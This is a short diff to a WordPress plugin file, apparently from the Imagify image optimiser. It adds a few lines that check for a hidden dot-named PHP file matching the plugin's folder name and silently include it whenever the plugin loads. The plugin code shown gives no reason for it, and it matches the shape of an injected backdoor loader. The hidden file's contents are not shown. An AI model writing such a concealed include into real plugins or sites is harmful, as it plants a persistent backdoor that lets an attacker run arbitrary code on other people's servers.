@@ -8,6 +8,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  *
  * @since 1.4
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_do_async_job( $body ) {
 	$args = [
 		'timeout'   => 0.01,
